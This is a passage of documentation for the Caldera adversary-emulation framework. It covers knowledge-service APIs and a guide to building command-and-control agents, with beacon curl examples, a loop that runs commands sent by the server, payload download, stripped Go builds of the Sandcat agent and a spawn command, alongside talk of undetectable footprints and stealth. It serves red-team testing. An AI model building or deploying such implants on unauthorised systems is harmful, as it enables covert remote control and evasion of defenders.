* `KnowledgeService.update_relationship(criteria, updates)` - Update an existing relationship in the datastore. The `criteria` argument should be a dictionary containing files to match relationships and their component facts against, while the `updates` argument should be dictionary of similar form, containing the values to update.

```python
app.objects.secondclass.c_rule
```
* `KnowledgeService.add_rule(rule)` - Add a rule to the datastore. The `rule` argument must be an already existing `Rule()` object.
* `KnowledgeService.delete_rule(criteria)` - Remove a rule from the datastore. The `criteria` argument should be a dictionary containing fields and values to match existing rules against.
* `KnowledgeService.get_rules(criteria)` - Retrieve matching rules from the datastore. The `criteria` argument should be a dictionary containing files to match existing rules against.

All objects added to the Knowledge service are checked against existing objects in order to enforce de-duplication, with one caveat. As origin is tracked for facts generated by links in the current implementation, this means duplicate facts created during different operations can exist in the fact store simultaneously. Facts/Relationships are usually automatically added to the fact store by `Link` objects as part of the process of parsing output, though they can be added manually should the need arise.

# How to Build Agents

Building your own agent is a way to create a unique - or undetectable - footprint on compromised machines. Our
default agent, Sandcat, is a representation of what an agent can do. This agent is written in GoLang and offers
an extensible collection of command-and-control (C2) protocols, such as communicating over HTTP or GitHub Gist. 

You can extend Sandcat by adding your own C2 protocols in place or you can follow this guide to create your own agent 
from scratch.

## Understanding contacts

Agents are processes which are deployed on compromised hosts and connect with the C2 server periodically for instructions.
An agent connects to the server through a *contact*, which is a specific connection point on the server.

Each contact is defined in an independent Python module and is registered with the contact_svc when the server starts.

There are currently several built-in contacts available: http, tcp, udp, websocket, gist (via Github), and dns. 

For additional stealth, supporting agents can use communication tunnels to tunnel built-in contacts like HTTP, TCP, and UDP. For more information on C2 communication tunneling, see the [C2 tunneling section](C2-Tunneling.md).

## Building an agent: HTTP contact

Start by getting a feel for the HTTP endpoint, which are located in the contacts/contact_http.py module.
```
POST  /beacon 
```
### Part #1

Start by writing a POST request to the /beacon endpoint. 

In your agent code, create a flat JSON dictionary of key/value pairs and ensure the following properties are included
as keys. Add values which correlate to the host your agent will be running on. Note - all of these properties are
optional - but you should aim to cover as many as you can.

> If you don't include a platform and executors then the server will never provide instructions to the agent, as it 
won't know which ones are valid to send. 

* **server**: The location (IP or FQDN) of the C2 server  
* **platform**: The operating system
* **host**: The hostname of the machine
* **group**: Either red or blue. This determines if your agent will be used as a red or blue agent.
* **paw**: The current unique identifier for the agent, either initially generated by the agent itself or provided by the C2 on initial beacon.
* **username**: The username running the agent
* **architecture**: The architecture of the host
* **executors**: A list of executors allowed on the host
* **privilege**: The privilege level of the agent process, either User or Elevated
* **pid**: The process identifier of the agent
* **ppid**: The process identifier of the agent's parent process
* **location**: The location of the agent on disk
* **exe_name**: The name of the agent binary file
* **host_ip_addrs**: A list of valid IPv4 addresses on the host
* **proxy_receivers**: a dict (key: string, value: list of strings) that maps a peer-to-peer proxy protocol name to a list of addresses that the agent is listening on for peer-to-peer client requests.
* **deadman_enabled**: a boolean that tells the C2 server whether or not this agent supports deadman abilities. If this value is not provided, the server assumes that the agent does not support deadman abilities.
* **upstream_dest**: The "next hop" upstream destination address (e.g. IP or FQDN) that the agent uses to
reach the C2 server. If the agent is using peer-to-peer communication to reach the C2, this value will contain
the peer address rather than the C2 address.

At this point, you are ready to make a POST request with the profile to the /beacon endpoint. You should get back:

1) The recommended number of seconds to sleep before sending the next beacon
2) The recommended number of seconds (watchdog) to wait before killing the agent, once the server is unreachable (0 means infinite)
3) A list of instructions - base64 encoded.
```
profile=$(echo '{"server":"http://127.0.0.1:8888","platform":"darwin","executors":["sh"]}' | base64)
curl -s -X POST -d $profile localhost:8888/beacon | base64 --decode
...{"paw": "dcoify", sleep": 59, "watchdog": 0, "instructions": "[...]"}
```

If you get a malformed base64 error, that means the operating system you are using is adding an empty space to the 
profile variable. You can prove this by 
```
echo $profile
```

To resolve this error, simply change the line to (note the only difference is '-w 0'):
```
profile=$(echo '{"server":"http://127.0.0.1:8888","platform":"darwin","executors":["sh"]}' | base64 -w 0)
```

> The paw property returned back from the server represents a unique identifier for your new agent. Each
time you call the /beacon endpoint without this paw, a new agent will be created on the server - so you should ensure
that future beacons include it.

You can now navigate to the Caldera UI, click into the agents tab and view your new agent. 

### Part #2

Now it's time to execute the instructions. 

Looking at the previous response, you can see each instruction contains:

* **id**: The link ID associated to the ability
* **sleep**: A recommended pause to take after running this instruction
* **command**: A base64 encoded command to run
* **executor**: The executor to run the command under
* **timeout**: How long to let the command run before timing it out
* **payload**: A payload file name which must be downloaded before running the command, if applicable
* **uploads**: A list of file names that the agent must upload to the C2 server after running the command.

Now, you'll want to revise your agent to loop through all the instructions, executing each command
and POSTing the response back to the /beacon endpoint. You should pause after running each instruction, using the sleep time provided inside the instruction.
```
data=$(echo '{"paw":"$paw","results":[{"id":$id, "output":$output, "stderr":$stderr, "exit_code":$exit_code, "status": $status, "pid":$pid}]}' | base64)
curl -s -X POST -d $data localhost:8888/beacon
sleep $instruction_sleep
```

The POST details inside the result are as follows:

* **id**: the ID of the instruction you received
* **output**: the base64 encoded output (or stdout) from running the instruction
* **stderr**: the base64 encoded error messages (or stderr) from running the instruction
* **exit_code**: the OS or process exit code from running the instruction.  If unsure, leave blank. 
* **status**: the status code from running the instruction. If unsure, put 0.
* **pid**: the process identifier the instruction ran under. If unsure, put 0.

Once all instructions are run, the agent should sleep for the specified time in the beacon before calling the /beacon 
endpoint again. This process should repeat forever. 

### Part #3

Inside each instruction, there is an optional *payload* property that contains a filename of a file to download
before running the instruction. To implement this, add a file download capability to your agent, directing it to
the /file/download endpoint to retrieve the file:
```
payload='some_file_name.txt"
curl -X POST -H "file:$payload" http://localhost:8888/file/download > some_file_name.txt
```

### Part 4

Inside each instruction, there is an optional **uploads** property that contains a list of filenames to upload to the C2 after running the instruction and submitting the execution results. To implement this, add a file upload capability to your agent. If using the HTTP contact, the file upload should hit the `/file/upload` upload endpoint of the server.

### Part #5

You should implement the watchdog configuration. This property, passed to the agent in every beacon, contains
the number of seconds to allow a dead beacon before killing the agent. 

## Lateral Movement Tracking

Additionally, you may want to take advantage of Caldera's lateral movement tracking capabilities. Caldera's current 
implementation for tracking lateral movement depends on passing the ID of the Link spawning the agent as 
an argument to the agent's spawn command and upon the agent's check in, for this Link ID to be returned as part of the
agent's profile. The following section explains how lateral movement tracking has been enabled for the default agent,
Sandcat.  

## Manually Compiling Sandcat Agent

To create a standalone Sandcat agent executable without supplying CLI options or header values, you need to recompile the Sandcat agent with your Caldera server IP address and port number. 

Start by locating the `sandcat.go` file in the Sandcat plugin directory. The full path is `caldera\plugins\sandcat\gocat\sandcat.go`. This file contains default values that can be hardcoded. To create an agent with hardcoded credentials for your Caldera server, adjust the `server` variable to
 `"http://<YourCalderaServerIP>:<YourCalderaServerPort>"`. 

After modifying the file, recompile the Sandcat agent with your server configuration. Run the appropriate command from the `caldera\plugins\sandcat\gocat` directory, depending on the operating system in which the agent will be running:

- Windows\
`GOOS=windows go build -o ../payloads/sandcat.go-windows -ldflags="-s -w" sandcat.go`

- Linux\
`GOOS=linux go build -o ../payloads/sandcat.go-linux -ldflags="-s -w" sandcat.go`

- Mac/Unix\
`GOOS=darwin go build -o ../payloads/sandcat.go-darwin -ldflags="-s -w" sandcat.go`

If Go isn't installed in your Sandcat agent's environment, you can change the file extension of the agent before recompiling it. For instance:

- Windows\
`GOOS=windows go build -o ../payloads/sandcat.exe -ldflags="-s -w" sandcat.go`

- Linux\
`GOOS=linux go build -o ../payloads/sandcat.bin -ldflags="-s -w" sandcat.go`

- Mac/Unix\
`GOOS=darwin go build -o ../payloads/sandcat.app -ldflags="-s -w" sandcat.go`

### Sandcat

An example Sandcat spawn command has been copied from the [Service Creation ability](https://github.com/mitre/stockpile/blob/master/data/abilities/execution/95727b87-175c-4a69-8c7a-a5d82746a753.yml)
and included below for reference:
```
C:\Users\Public\s4ndc4t.exe -server #{server} -originLinkID #{origin_link_id}
```
If the Caldera server is running on `http://192.168.0.1:8888` and the ID of the Link with the spawn command is `cd63fdbb-0f3a-49ea-b4eb-306a3ff40f81`,
the populated command will appear as:
```
C:\Users\Public\s4ndc4t.exe -server http://192.168.0.1:8888 -originLinkID cd63fdbb-0f3a-49ea-b4eb-306a3ff40f81
```
The Sandcat agent stores the value of this global variable in its profile, which is then returned to the Caldera server
upon first check-in as a key\value pair `origin_link_id : cd63fdbb-0f3a-49ea-b4eb-306a3ff40f81` in the JSON dictionary. The Caldera server will 
automatically store this pair when creating the Agent object and use it when generating the Attack Path graph in the
Debrief plugin.

**NOTE: The `origin_link_id` key is optional and not required for the Caldera server to register and use new agents as
 expected. It is only required to take advantage of the lateral movement tracking in the Debrief plugin.**  
